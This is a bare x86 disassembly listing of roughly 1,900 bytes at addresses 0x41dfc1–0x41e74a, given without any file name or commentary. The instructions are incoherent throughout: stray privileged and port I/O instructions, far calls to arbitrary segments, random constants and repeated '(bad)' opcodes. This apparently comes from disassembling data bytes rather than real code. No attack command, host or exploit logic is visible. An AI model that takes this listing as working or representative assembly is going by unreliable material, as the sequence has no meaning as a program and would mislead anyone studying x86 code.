  41dfc1:	mov    ah,0xd2
  41dfc3:	cmp    ebx,ecx
  41dfc5:	pop    edx
  41dfc6:	iret   
  41dfc7:	ret    0xa379
  41dfca:	cld    
  41dfcb:	jns    0x41df83
  41dfcd:	dec    ecx
  41dfce:	jecxz  0x41e024
  41dfd0:	rol    BYTE PTR [edi-0x75a5bf0e],cl
  41dfd6:	add    eax,0xc322b915
  41dfdb:	mul    DWORD PTR [esi+0x14]
  41dfde:	mov    esp,0x9cf524d3
  41dfe3:	mov    cl,0xbc
  41dfe5:	dec    edx
  41dfe6:	sub    BYTE PTR [ebp-0x9],cl
  41dfe9:	sti    
  41dfea:	xlat   BYTE PTR ds:[ebx]
  41dfeb:	pop    esp
  41dfec:	push   ecx
  41dfed:	pop    ebx
  41dfee:	das    
  41dfef:	retf   
  41dff0:	xchg   ecx,eax
  41dff1:	je     0x41df8d
  41dff3:	mov    ah,0x85
  41dff5:	fstp   QWORD PTR ds:0x507f104f
  41dffb:	call   0x77a1:0xc99ce4b8
  41e002:	xchg   esi,eax
  41e003:	icebp  
  41e004:	and    eax,0x9d7fc921
  41e009:	loop   0x41df9a
  41e00b:	mov    bl,0xc0
  41e00d:	mov    al,ds:0xa0f82195
  41e012:	imul   edi,DWORD PTR [edx],0xffffffa7
  41e015:	imul   edx,ebx,0x4a
  41e018:	dec    edx
  41e019:	sbb    al,ch
  41e01b:	xor    ch,BYTE PTR [edx+0x117b6a9]
  41e021:	xor    eax,DWORD PTR ds:0x593a8262
  41e027:	es inc edi
  41e029:	mov    ah,0xe2
  41e02b:	jo     0x41e000
  41e02d:	xor    eax,0x37957dcd
  41e032:	xchg   ecx,eax
  41e033:	cmp    bl,ch
  41e035:	(bad)  
  41e037:	loope  0x41e0af
  41e039:	repnz pop eax
  41e03b:	mov    ah,0x5e
  41e03d:	xchg   edx,eax
  41e03e:	punpckhbw mm7,QWORD PTR [ebx+0x4e]
  41e042:	xchg   ecx,eax
  41e043:	in     al,dx
  41e044:	fcom   DWORD PTR [ecx+0x45]
  41e047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e048:	es (bad) 
  41e04a:	test   DWORD PTR es:[edx-0x3459c60b],edi
  41e051:	sub    al,bl
  41e053:	call   0x1f4e:0xd75f2f3c
  41e05a:	lock pop esp
  41e05c:	jb     0x41e058
  41e05e:	shr    DWORD PTR ds:0xd9806d11,1
  41e064:	in     eax,dx
  41e065:	in     al,0x97
  41e067:	arpl   WORD PTR [ecx],sp
  41e069:	add    ch,al
  41e06b:	ret    0x12cb
  41e06e:	mov    DWORD PTR [esi],eax
  41e070:	(bad)  
  41e071:	lahf   
  41e072:	mov    cl,0xd3
  41e074:	cwde   
  41e075:	adc    al,BYTE PTR [edi-0x74]
  41e078:	not    BYTE PTR [esi-0x28ae211b]
  41e07e:	adc    eax,DWORD PTR [ebp-0x1958f7b3]
  41e084:	retf   0x1d21
  41e087:	mov    cl,0x9
  41e089:	pusha  
  41e08a:	jb     0x41e017
  41e08c:	push   esp
  41e08d:	xchg   edx,eax
  41e08e:	les    esp,FWORD PTR [eax+0x4e]
  41e091:	cs or  eax,0xe6def047
  41e097:	std    
  41e098:	jge    0x41e030
  41e09a:	js     0x41e084
  41e09c:	mov    DWORD PTR [esi-0x79],ecx
  41e09f:	pop    ebx
  41e0a0:	in     al,dx
  41e0a1:	ins    BYTE PTR es:[edi],dx
  41e0a2:	test   al,0x57
  41e0a4:	and    ch,0x5c
  41e0a7:	call   0x3b7368af
  41e0ac:	and    BYTE PTR [edi-0x20037771],bl
  41e0b2:	in     eax,0x32
  41e0b4:	retf   0x9969
  41e0b7:	out    dx,al
  41e0b8:	test   bh,cl
  41e0ba:	jae    0x41e0ea
  41e0bc:	cmp    DWORD PTR [edi-0x3c495c87],0xffffffb5
  41e0c3:	jbe    0x41e085
  41e0c5:	xchg   edi,eax
  41e0c6:	jge    0x41e07c
  41e0c8:	daa    
  41e0c9:	xchg   edi,eax
  41e0ca:	shl    esi,1
  41e0cc:	push   edx
  41e0cd:	push   ebp
  41e0ce:	mov    cl,cl
  41e0d0:	mul    DWORD PTR [ebx]
  41e0d2:	pop    ecx
  41e0d3:	push   ebp
  41e0d4:	enter  0xab32,0x6d
  41e0d8:	and    al,0xd9
  41e0da:	jbe    0x41e09a
  41e0dc:	f2xm1  
  41e0de:	lock leave 
  41e0e0:	dec    ebx
  41e0e1:	push   cs
  41e0e2:	les    ecx,FWORD PTR [ecx+0x56fdc531]
  41e0e8:	shr    DWORD PTR [ebx+ebp*4-0x60804836],0xce
  41e0f0:	cwde   
  41e0f1:	mov    al,BYTE PTR [ecx]
  41e0f3:	sbb    DWORD PTR [esi-0x6e3fb9c3],esi
  41e0f9:	jns    0x41e09e
  41e0fb:	leave  
  41e0fc:	or     eax,0x744920f2
  41e101:	mov    ecx,DWORD PTR [eax+0xddb4cd6]
  41e107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e108:	cmp    al,0xe5
  41e10a:	mov    ebx,0x418e934b
  41e10f:	shl    BYTE PTR [eax-0x7569f04b],0xec
  41e116:	add    eax,0x291ddc1a
  41e11b:	je     0x41e0f0
  41e11d:	sti    
  41e11e:	in     al,0x10
  41e120:	je     0x41e185
  41e122:	out    dx,eax
  41e123:	dec    esp
  41e124:	test   eax,0x72157fae
  41e129:	pop    edi
  41e12a:	dec    eax
  41e12b:	aas    
  41e12c:	mov    WORD PTR [esi-0x58cd7df2],?
  41e132:	int3   
  41e133:	call   0x36ac636f
  41e138:	sbb    bh,BYTE PTR [edi+0x5b8376bc]
  41e13e:	bound  ebx,QWORD PTR ds:0x46877f9d
  41e144:	shr    edi,cl
  41e146:	cs xchg ecx,eax
  41e148:	xor    edi,DWORD PTR [ecx+eiz*2]
  41e14b:	dec    esi
  41e14c:	push   edx
  41e14d:	mov    edi,0xeb0bf10d
  41e152:	cmp    BYTE PTR [esi],cl
  41e154:	repz imul edi,DWORD PTR [edx-0x39dc0ffd],0x5e8ba6c8
  41e15f:	dec    ecx
  41e160:	add    ebp,eax
  41e162:	repz xor DWORD PTR [eax],edi
  41e165:	jle    0x41e0fc
  41e167:	and    eax,0x2c61174a
  41e16c:	jecxz  0x41e0fb
  41e16e:	or     ecx,DWORD PTR ds:0x920c8f94
  41e174:	nop
  41e175:	xlat   BYTE PTR ds:[ebx]
  41e176:	stos   DWORD PTR es:[edi],eax
  41e177:	jl     0x41e1a6
  41e179:	leave  
  41e17a:	leave  
  41e17b:	dec    ebx
  41e17c:	scas   eax,DWORD PTR es:[edi]
  41e17d:	scas   eax,DWORD PTR es:[edi]
  41e17e:	mov    DWORD PTR [eax],esp
  41e180:	cld    
  41e181:	adc    esi,DWORD PTR [esi+ebx*8-0x21]
  41e185:	out    dx,eax
  41e186:	repz sar BYTE PTR [esi+0x3e],1
  41e18a:	loopne 0x41e1bc
  41e18c:	xchg   sp,ax
  41e18f:	jmp    0x9a8d9c21
  41e194:	adc    DWORD PTR [ebx],ebp
  41e196:	adc    DWORD PTR ds:0x645b56a6,0xfffffffc
  41e19d:	in     eax,dx
  41e19e:	cmp    esi,DWORD PTR ds:0x30878606
  41e1a4:	into   
  41e1a5:	inc    eax
  41e1a6:	pop    edx
  41e1a7:	dec    edx
  41e1a8:	pop    edi
  41e1a9:	mul    DWORD PTR [ebx+ebx*8+0x14]
  41e1ad:	mov    WORD PTR [edi-0x77],fs
  41e1b0:	ror    DWORD PTR [edx-0x5],cl
  41e1b3:	dec    edi
  41e1b4:	xor    DWORD PTR [edx+0x64],eax
  41e1b7:	inc    eax
  41e1b8:	ja     0x41e1c2
  41e1ba:	xchg   esp,eax
  41e1bb:	sbb    al,0x46
  41e1bd:	pop    esp
  41e1be:	jmp    0xcf470ea7
  41e1c3:	aaa    
  41e1c4:	add    BYTE PTR [ecx],dh
  41e1c6:	cmp    al,0xfc
  41e1c8:	add    BYTE PTR es:[edi-0x7ab65cc4],ch
  41e1cf:	retf   0x2c6c
  41e1d2:	in     al,0x82
  41e1d4:	mov    esp,0x3cfab6c7
  41e1d9:	(bad)  
  41e1db:	out    0xa2,eax
  41e1dd:	jmp    0xb7a6:0x4ab36ffd
  41e1e4:	xor    al,0xb7
  41e1e6:	pop    edx
  41e1e7:	test   BYTE PTR [ecx-0x70],al
  41e1ea:	push   esi
  41e1eb:	jmp    0x41e179
  41e1ed:	push   0xfffffff8
  41e1ef:	pop    esi
  41e1f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1f1:	(bad)  
  41e1f2:	aad    0x9e
  41e1f4:	and    BYTE PTR [edi-0x34],bl
  41e1f7:	and    bl,0x2
  41e1fa:	mov    edi,gs
  41e1fc:	loopne 0x41e247
  41e1fe:	xor    al,0x97
  41e200:	mov    al,ds:0xf4debd1e
  41e205:	bswap  ebx
  41e207:	popf   
  41e208:	sbb    bl,BYTE PTR [ebx+0x77]
  41e20b:	not    DWORD PTR [edx]
  41e20d:	mov    ecx,0x42901fdc
  41e212:	aas    
  41e213:	sahf   
  41e214:	add    bh,BYTE PTR [edx+ecx*2+0x11]
  41e218:	cmp    BYTE PTR [edi+0x8662c5],0x24
  41e21f:	jmp    0x8cc57e2d
  41e224:	fcomp  st(5)
  41e226:	push   ds
  41e227:	cmp    al,0x1f
  41e229:	call   0x948eb128
  41e22e:	call   0xd111:0x22032083
  41e235:	or     eax,0x92320605
  41e23a:	pop    esi
  41e23b:	sub    DWORD PTR [edx],0x1a
  41e23e:	push   ds
  41e23f:	xor    al,0x4c
  41e241:	mov    esi,0xf38f8375
  41e246:	jnp    0x41e21d
  41e248:	sbb    eax,0x4224237d
  41e24d:	aas    
  41e24e:	or     al,0x24
  41e250:	bound  edi,QWORD PTR [edi-0x55]
  41e253:	fwait
  41e254:	leave  
  41e255:	push   esp
  41e256:	pop    es
  41e257:	mov    ch,0x67
  41e259:	jno    0x41e231
  41e25b:	add    DWORD PTR [ecx],edx
  41e25d:	pop    ebp
  41e25e:	lods   eax,DWORD PTR ds:[esi]
  41e25f:	and    bh,BYTE PTR [ebx+0x705f943d]
  41e265:	mov    ebx,DWORD PTR [ecx+esi*2]
  41e268:	icebp  
  41e269:	dec    ebp
  41e26a:	hlt    
  41e26b:	mov    WORD PTR ds:0x82062e01,ss
  41e271:	pop    ecx
  41e272:	ins    DWORD PTR es:[edi],dx
  41e273:	imul   ebx
  41e275:	inc    esi
  41e276:	push   eax
  41e277:	or     DWORD PTR [ecx+0x69592ce0],edx
  41e27d:	add    BYTE PTR [edi+ebp*1-0x4d],bh
  41e281:	and    al,BYTE PTR [ecx]
  41e283:	pop    edx
  41e284:	xor    al,0x58
  41e286:	mov    ds:0x5e27ed4c,al
  41e28b:	cmp    dh,bl
  41e28d:	jnp    0x41e282
  41e28f:	das    
  41e290:	retw   0x5a90
  41e294:	(bad)  
  41e296:	jp     0x41e2d8
  41e298:	push   edi
  41e299:	jnp    0x41e2e9
  41e29b:	xor    dh,BYTE PTR [edi+0xd0ad9c9]
  41e2a1:	in     al,0xc6
  41e2a3:	in     eax,0xd2
  41e2a5:	test   DWORD PTR [ecx-0x17],esp
  41e2a8:	xchg   ecx,eax
  41e2a9:	pop    eax
  41e2aa:	mov    al,0x61
  41e2ac:	xor    BYTE PTR [ebp-0x22137d4a],dl
  41e2b2:	cmp    eax,0xee0b31cb
  41e2b7:	jae    0x41e2e6
  41e2b9:	dec    edx
  41e2ba:	rcr    BYTE PTR [ebx],cl
  41e2bc:	xchg   ecx,eax
  41e2bd:	fmul   st,st(5)
  41e2bf:	ret    0x49a1
  41e2c2:	fs sbb edx,ebx
  41e2c5:	jae    0x41e320
  41e2c7:	adc    eax,0xaa8dd6b3
  41e2cc:	ret    0x996b
  41e2cf:	sub    BYTE PTR [edx],bl
  41e2d1:	adc    dl,BYTE PTR [ebp-0x428d5720]
  41e2d7:	loop   0x41e334
  41e2d9:	add    BYTE PTR [edi-0x6f],ah
  41e2dc:	inc    esp
  41e2dd:	and    DWORD PTR [ecx],0xffffffec
  41e2e0:	mov    cl,0xe4
  41e2e2:	add    ebx,DWORD PTR [edi-0x55338798]
  41e2e8:	sub    BYTE PTR [esi+0x30],bl
  41e2eb:	cli    
  41e2ec:	mov    ds:0x3495647,al
  41e2f1:	and    bl,BYTE PTR [ebx+0x6]
  41e2f4:	fstp   DWORD PTR [ebx]
  41e2f6:	pop    ss
  41e2f7:	loopne 0x41e363
  41e2f9:	dec    ebp
  41e2fa:	ins    BYTE PTR es:[edi],dx
  41e2fb:	inc    esi
  41e2fc:	inc    eax
  41e2fd:	pushf  
  41e2fe:	pop    ebx
  41e2ff:	daa    
  41e300:	rcl    BYTE PTR [ebx-0xc07ba69],0x62
  41e307:	data16 fstp DWORD PTR [ebp-0x4c]
  41e30b:	clc    
  41e30c:	jge    0x41e2df
  41e30e:	push   eax
  41e30f:	mov    dh,BYTE PTR [ebx-0x4c]
  41e312:	xchg   ebx,eax
  41e313:	das    
  41e314:	mov    ds:0xed99e3cf,eax
  41e319:	add    DWORD PTR [ebx-0x9],0x40
  41e31d:	jns    0x41e314
  41e31f:	scas   al,BYTE PTR es:[edi]
  41e320:	inc    ebx
  41e321:	add    eax,0xd779fbf2
  41e326:	xor    ch,al
  41e328:	add    BYTE PTR [esp+edx*4],ch
  41e32b:	aaa    
  41e32c:	mov    edx,0x17b56cdb
  41e331:	scas   eax,DWORD PTR es:[edi]
  41e332:	adc    eax,0xd665e13d
  41e337:	mov    cl,0x35
  41e339:	fucomp st(3)
  41e33b:	jb     0x41e32d
  41e33d:	sbb    BYTE PTR [edx+0x1b],dl
  41e340:	jg     0x41e355
  41e342:	sub    eax,0x81756e6
  41e347:	fucomp st(4)
  41e349:	pop    ebp
  41e34a:	dec    ecx
  41e34b:	adc    al,0xb5
  41e34d:	and    dl,BYTE PTR [eax+0x1a22877c]
  41e353:	psrlw  mm6,QWORD PTR [ecx+eax*8]
  41e357:	push   esi
  41e358:	add    BYTE PTR [ebx-0x5e16326a],cl
  41e35e:	ret    0xc023
  41e361:	mov    edi,0x76c495c1
  41e366:	enter  0xe49c,0xb3
  41e36a:	test   ebx,0xd5033346
  41e370:	loopne 0x41e3b7
  41e372:	push   DWORD PTR [edx+0x7cf0bf20]
  41e378:	int3   
  41e379:	bound  ebp,QWORD PTR [edx+eax*2+0x78f42a72]
  41e380:	popa   
  41e381:	retf   0x4bf1
  41e384:	fcomi  st,st(3)
  41e386:	outs   dx,DWORD PTR ds:[esi]
  41e387:	fnstsw WORD PTR [edi-0x6813b8af]
  41e38d:	in     eax,dx
  41e38e:	cmp    edx,DWORD PTR [esi*4-0x2ca2e8ad]
  41e395:	jae    0x41e3e7
  41e397:	icebp  
  41e398:	div    DWORD PTR [esi-0x1f7b75e9]
  41e39e:	and    DWORD PTR [esi+0x7485c7d3],edi
  41e3a4:	push   ebx
  41e3a5:	mov    eax,0x538e343a
  41e3aa:	add    ah,al
  41e3ac:	stos   BYTE PTR es:[edi],al
  41e3ad:	adc    edi,eax
  41e3af:	dec    edx
  41e3b0:	retf   
  41e3b1:	(bad)  
  41e3b2:	lahf   
  41e3b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3b4:	and    edx,DWORD PTR [esi-0x20b31cfc]
  41e3ba:	jb     0x41e41a
  41e3bc:	pop    edx
  41e3bd:	pop    eax
  41e3be:	add    al,0xb7
  41e3c0:	mov    bh,0x7f
  41e3c2:	cmp    dl,BYTE PTR [esi+0x6d8fd953]
  41e3c8:	xchg   edx,eax
  41e3c9:	adc    al,0x9c
  41e3cb:	sub    al,0x72
  41e3cd:	mov    DWORD PTR [ecx-0x5c66e85a],eax
  41e3d3:	xchg   ecx,eax
  41e3d4:	sbb    eax,0x2228334b
  41e3d9:	pop    eax
  41e3db:	data16 fs sub al,0x6d
  41e3df:	cs hlt 
  41e3e1:	cmp    DWORD PTR [eax-0x48],ebp
  41e3e4:	push   ds
  41e3e5:	push   eax
  41e3e6:	cwde   
  41e3e7:	stos   DWORD PTR es:[edi],eax
  41e3e8:	call   0x586ea7bc
  41e3ed:	mov    al,0x56
  41e3ef:	pop    edx
  41e3f0:	push   cs
  41e3f1:	add    ch,BYTE PTR [edi-0x39]
  41e3f4:	sbb    bh,0xff
  41e3f7:	popf   
  41e3f8:	mov    bh,0xef
  41e3fa:	retf   0xac88
  41e3fd:	jae    0x41e450
  41e3ff:	loope  0x41e3e4
  41e401:	imul   cl
  41e403:	sbb    ecx,DWORD PTR [edi-0x50f1df35]
  41e409:	mov    ebx,0x5c7d6045
  41e40e:	arpl   WORD PTR [edi+0x269f843c],si
  41e414:	push   esp
  41e415:	je     0x41e45f
  41e417:	and    cl,BYTE PTR [edx-0x78ad128e]
  41e41d:	bound  eax,QWORD PTR [esi+0x73]
  41e420:	mov    al,0xe9
  41e422:	xor    ecx,DWORD PTR [ecx-0x13]
  41e425:	adc    BYTE PTR [edi],ch
  41e427:	sub    dl,BYTE PTR [esi]
  41e429:	fdivp  st(3),st
  41e42b:	jge    0x41e3fb
  41e42d:	and    edi,esp
  41e42f:	out    dx,eax
  41e430:	cli    
  41e431:	ins    BYTE PTR es:[edi],dx
  41e432:	ins    BYTE PTR es:[edi],dx
  41e433:	cmp    BYTE PTR [ebx],0x7
  41e436:	mov    eax,0xa7f25928
  41e43b:	push   eax
  41e43c:	xor    esi,DWORD PTR ds:0x35a91c52
  41e442:	clc    
  41e443:	push   eax
  41e444:	lock inc ecx
  41e446:	rol    BYTE PTR [ebp+0x65],cl
  41e449:	int3   
  41e44a:	jae    0x41e493
  41e44c:	push   ebx
  41e44d:	push   eax
  41e44e:	aad    0x95
  41e450:	das    
  41e451:	lahf   
  41e452:	xchg   esp,eax
  41e453:	dec    edx
  41e454:	test   eax,0xa03ad356
  41e459:	xchg   DWORD PTR [ebp-0x3],edi
  41e45c:	mov    eax,ds:0x79dcd400
  41e461:	int    0x44
  41e463:	mov    ebx,0x103763b5
  41e468:	aam    0xaf
  41e46a:	out    dx,eax
  41e46b:	dec    ecx
  41e46c:	mov    ah,0x56
  41e46e:	(bad)  
  41e46f:	sub    ebx,DWORD PTR [edx+edi*4]
  41e472:	push   cs
  41e473:	jecxz  0x41e4d6
  41e475:	xchg   ebx,eax
  41e476:	xchg   DWORD PTR [edx],eax
  41e478:	cmp    DWORD PTR [esi],eax
  41e47a:	sub    cl,BYTE PTR [ebx+0x626850e]
  41e480:	xchg   edi,eax
  41e481:	jp     0x41e441
  41e483:	mov    al,ds:0x4aee95d1
  41e488:	and    eax,0x752d0816
  41e48d:	push   ebp
  41e48e:	xchg   ebp,eax
  41e48f:	sub    DWORD PTR [ebp+0x3d7e483e],esp
  41e495:	rol    BYTE PTR [ebp-0x39d646a0],1
  41e49b:	imul   ecx,DWORD PTR [eax-0x54],0xffffffae
  41e49f:	jbe    0x41e455
  41e4a1:	push   ebp
  41e4a2:	and    BYTE PTR [edx-0x7d6cf514],cl
  41e4a8:	ins    BYTE PTR es:[edi],dx
  41e4a9:	adc    dl,BYTE PTR [esi]
  41e4ab:	mov    ds:0xb60af652,al
  41e4b0:	stos   BYTE PTR es:[edi],al
  41e4b1:	stos   BYTE PTR es:[edi],al
  41e4b2:	xor    esp,DWORD PTR [ecx-0x12]
  41e4b5:	fisttp WORD PTR [ebx+ebp*4-0x1b]
  41e4b9:	adc    eax,0x1c68c6f7
  41e4be:	sbb    eax,0xf6132b95
  41e4c3:	inc    ebx
  41e4c4:	(bad)  
  41e4c5:	(bad)  
  41e4c6:	retf   0x73d6
  41e4c9:	xchg   edx,eax
  41e4ca:	mov    ds:0xd259f336,eax
  41e4cf:	or     dh,bl
  41e4d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4d2:	jp     0x41e45e
  41e4d4:	inc    esp
  41e4d5:	into   
  41e4d6:	ss inc esp
  41e4d8:	rol    ecx,1
  41e4da:	aam    0xbf
  41e4dc:	dec    esp
  41e4dd:	fild   WORD PTR [ecx+0x10]
  41e4e0:	push   ss
  41e4e1:	mov    edx,0xd0f4f4ae
  41e4e6:	test   edi,edx
  41e4e8:	scas   al,BYTE PTR es:[edi]
  41e4e9:	jns    0x41e537
  41e4eb:	push   ebp
  41e4ec:	aad    0x40
  41e4ee:	mov    bl,0xcb
  41e4f0:	adc    DWORD PTR [ebx],edi
  41e4f2:	stc    
  41e4f3:	leave  
  41e4f4:	int3   
  41e4f5:	pop    edi
  41e4f6:	jmp    0x41e4ca
  41e4f8:	imul   esi,DWORD PTR [esi],0x1402dc9a
  41e4fe:	cmc    
  41e4ff:	aad    0xb2
  41e501:	pop    ecx
  41e502:	jbe    0x41e523
  41e504:	add    ah,BYTE PTR [esi-0x47795252]
  41e50a:	mov    eax,ds:0x2493484f
  41e50f:	mov    al,ds:0x9a7004da
  41e514:	xchg   ebx,eax
  41e515:	test   BYTE PTR [eax+0x21],ah
  41e518:	bound  edx,QWORD PTR [edi+eiz*8-0x2c]
  41e51c:	mov    ds:0xd4a5fd9d,eax
  41e521:	(bad)  
  41e522:	xor    edi,DWORD PTR [edx+0x78b333b4]
  41e528:	inc    ecx
  41e529:	pop    ss
  41e52a:	jae    0x41e5a2
  41e52c:	add    ebp,eax
  41e52e:	call   0x7cba:0xa98ec50e
  41e535:	fnstcw WORD PTR [ecx-0x4b]
  41e538:	in     al,dx
  41e539:	ds push ds
  41e53b:	inc    ebp
  41e53c:	loopne 0x41e542
  41e53e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e53f:	adc    DWORD PTR [ebx+0x66d3a421],ecx
  41e545:	shr    ah,cl
  41e547:	dec    ecx
  41e548:	call   0x610baae
  41e54d:	mov    ?,WORD PTR [ecx+0x15]
  41e550:	xor    DWORD PTR [edx-0x68],edi
  41e553:	fmul   DWORD PTR [ebp+ebp*4-0x78]
  41e557:	mov    ch,dh
  41e559:	out    0x83,al
  41e55b:	fmul   QWORD PTR [eax]
  41e55d:	sbb    al,0xd1
  41e55f:	mov    bl,0xd2
  41e561:	fbstp  TBYTE PTR [edx-0x5a]
  41e564:	or     cl,dl
  41e566:	xchg   BYTE PTR [eax+ebx*1-0x7],cl
  41e56a:	inc    ecx
  41e56b:	push   ds
  41e56c:	fcmovu st,st(5)
  41e56e:	fdiv   QWORD PTR ds:0x2e5d2d3f
  41e574:	ficomp DWORD PTR [ecx+0x38937eb5]
  41e57a:	cli    
  41e57b:	mov    edi,0x6b7aca8
  41e580:	push   ebp
  41e581:	pushf  
  41e582:	sub    al,bl
  41e584:	fadd   QWORD PTR [edi+0x5a]
  41e587:	and    ah,BYTE PTR [edi-0x36]
  41e58a:	sbb    al,0xad
  41e58c:	sbb    al,BYTE PTR [ecx-0x47]
  41e58f:	cmp    DWORD PTR [edi-0x74d980da],0x9eec6d46
  41e599:	loope  0x41e594
  41e59b:	push   esi
  41e59c:	test   DWORD PTR [esi],0xd0cf7469
  41e5a2:	pusha  
  41e5a3:	jno    0x41e5c1
  41e5a5:	and    bl,BYTE PTR [ebp+0x78]
  41e5a8:	loopne 0x41e604
  41e5aa:	mov    al,0x43
  41e5ac:	or     al,0xe6
  41e5ae:	test   BYTE PTR [eax+0x45c26005],dh
  41e5b4:	stc    
  41e5b5:	jl     0x41e55e
  41e5b7:	cmp    edx,ebp
  41e5b9:	push   esp
  41e5ba:	mov    ecx,0x35edd6c2
  41e5bf:	ss call 0x59b292b4
  41e5c5:	(bad)  
  41e5c6:	repz mov fs,edx
  41e5c9:	fld    QWORD PTR [edi]
  41e5cb:	pop    edi
  41e5cc:	out    0x58,eax
  41e5ce:	rcr    edx,0xc1
  41e5d1:	(bad)  
  41e5d2:	mov    ecx,0x23c4dddc
  41e5d7:	xor    al,0x75
  41e5d9:	add    eax,0x7f253dcb
  41e5de:	jae    0x41e569
  41e5e0:	rcl    BYTE PTR [edx+ebx*1+0x3acb2469],cl
  41e5e7:	and    bh,BYTE PTR [edi-0x1d160755]
  41e5ed:	add    al,0x34
  41e5ef:	jg     0x41e5c9
  41e5f1:	sub    al,0x74
  41e5f3:	jmp    0xd48e:0x9226ff56
  41e5fa:	pop    eax
  41e5fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5fc:	sub    ecx,ecx
  41e5fe:	xchg   esp,eax
  41e5ff:	jle    0x41e627
  41e601:	stos   DWORD PTR es:[edi],eax
  41e602:	and    eax,0x2e51f148
  41e607:	pop    ds
  41e608:	out    dx,al
  41e609:	xor    BYTE PTR [ebx+0x6b1e273],dl
  41e60f:	shl    DWORD PTR [ecx],1
  41e611:	out    0x62,eax
  41e613:	push   ds
  41e614:	and    BYTE PTR [ebx+0x7],ah
  41e617:	mov    dh,0x44
  41e619:	cli    
  41e61a:	inc    esi
  41e61b:	xchg   edi,eax
  41e61c:	xor    edx,eax
  41e61e:	(bad)  
  41e61f:	les    ebp,FWORD PTR [eax-0x44612dee]
  41e625:	jnp    0x41e624
  41e627:	push   ecx
  41e628:	dec    ebp
  41e629:	not    DWORD PTR [ecx]
  41e62b:	mov    WORD PTR [ecx+0x50],gs
  41e62e:	sub    ebp,DWORD PTR [ecx+0x69]
  41e631:	repnz fs repnz xchg edi,eax
  41e635:	loopne 0x41e621
  41e637:	pop    ebx
  41e638:	add    dl,dl
  41e63a:	(bad)  
  41e63b:	sti    
  41e63c:	mov    ebx,0x79b86dce
  41e641:	sar    DWORD PTR [ecx],1
  41e643:	daa    
  41e644:	or     al,0x18
  41e646:	pushf  
  41e647:	or     dl,bh
  41e649:	xchg   ebp,eax
  41e64a:	mov    edi,DWORD PTR [eax]
  41e64c:	cmp    BYTE PTR [esi-0x9b1c25b],bh
  41e652:	pop    ds
  41e653:	dec    edi
  41e654:	cld    
  41e655:	hlt    
  41e656:	mov    ds:0xe6619682,al
  41e65b:	pop    ebx
  41e65c:	dec    ebx
  41e65d:	push   edi
  41e65e:	fdiv   st(1),st
  41e660:	mov    esp,0x138a6d9b
  41e665:	das    
  41e666:	jle    0x41e6a0
  41e668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e669:	mov    fs,WORD PTR [edi+0xeb5417b]
  41e66f:	adc    DWORD PTR [ebx],0x66
  41e672:	scas   eax,DWORD PTR es:[edi]
  41e673:	jae    0x41e6cd
  41e675:	mov    bh,0x6f
  41e677:	cld    
  41e678:	cmp    eax,DWORD PTR [eax-0x61]
  41e67b:	mov    eax,0xbbc08ff6
  41e680:	sbb    DWORD PTR [esi+0x2d850af1],edx
  41e686:	push   edx
  41e687:	scas   al,BYTE PTR es:[edi]
  41e688:	sub    al,0x3f
  41e68a:	pop    esi
  41e68b:	add    BYTE PTR [ebx],al
  41e68d:	or     eax,0x28a1abcd
  41e692:	fcomp  DWORD PTR [eax-0x6b]
  41e695:	add    al,0xe6
  41e697:	mov    edx,0xb80e0d86
  41e69c:	outs   dx,BYTE PTR ds:[esi]
  41e69d:	mov    ebp,0xc9be5162
  41e6a2:	das    
  41e6a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6a4:	dec    eax
  41e6a6:	xchg   esp,eax
  41e6a7:	call   0x797e:0x3e08b7de
  41e6ae:	xor    esi,DWORD PTR [ebp+0x5a]
  41e6b1:	pushf  
  41e6b2:	ins    BYTE PTR es:[edi],dx
  41e6b3:	imul   edi,DWORD PTR [edx+0x4618cd9c],0x69c278fa
  41e6bd:	cmp    bh,0x44
  41e6c0:	in     eax,0xb2
  41e6c2:	iret   
  41e6c3:	sbb    esp,esp
  41e6c5:	jg     0x41e6ca
  41e6c7:	inc    ebx
  41e6c8:	inc    edx
  41e6c9:	iret   
  41e6ca:	or     ecx,DWORD PTR [ecx]
  41e6cc:	out    0x29,al
  41e6ce:	aaa    
  41e6cf:	repz push ebx
  41e6d1:	inc    ebx
  41e6d2:	sbb    ch,bl
  41e6d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6d5:	push   esi
  41e6d6:	jns    0x41e73a
  41e6d8:	(bad)  
  41e6da:	jae    0x41e695
  41e6dc:	sti    
  41e6dd:	xchg   ecx,eax
  41e6de:	mov    bl,0x55
  41e6e0:	pop    ecx
  41e6e1:	fist   WORD PTR [esp+ebp*1]
  41e6e4:	mov    cl,0x69
  41e6e6:	push   es
  41e6e7:	repz out dx,al
  41e6e9:	shr    bl,0x3a
  41e6ec:	xor    ah,BYTE PTR [edi+0x62]
  41e6ef:	je     0x41e68c
  41e6f1:	(bad)  
  41e6f2:	mov    fs,WORD PTR [ecx]
  41e6f4:	fcom   QWORD PTR [eax+0x66e00e45]
  41e6fa:	jmp    0x41e766
  41e6fc:	add    ah,BYTE PTR [eax+edi*1+0x355cc20]
  41e703:	inc    ebx
  41e704:	jnp    0x41e6b7
  41e706:	pop    esp
  41e707:	les    edx,FWORD PTR [ebp+0x5297e84]
  41e70d:	add    BYTE PTR [edi+ebx*4],cl
  41e710:	pushf  
  41e711:	stc    
  41e712:	adc    bl,BYTE PTR [ebx]
  41e714:	jae    0x41e6eb
  41e716:	jo     0x41e6d4
  41e718:	push   ecx
  41e719:	lock pop ebx
  41e71b:	lahf   
  41e71c:	mov    cl,0x6a
  41e71e:	icebp  
  41e71f:	and    DWORD PTR ds:0x82ea6c6e,esp
  41e725:	mov    esi,esp
  41e727:	mov    eax,ds:0xb7161c0b
  41e72c:	jecxz  0x41e6c5
  41e72e:	jge    0x41e703
  41e730:	loop   0x41e70b
  41e732:	jl     0x41e6f2
  41e734:	or     ah,BYTE PTR [edx+0x1ff92fe8]
  41e73a:	mov    edx,0xbcaaea53
  41e73f:	popa   
  41e740:	inc    edx
  41e741:	repnz stc 
  41e743:	rcl    BYTE PTR [eax+eiz*4+0xe],1
  41e747:	cs xor ebx,edx
  41e74a:	clc    
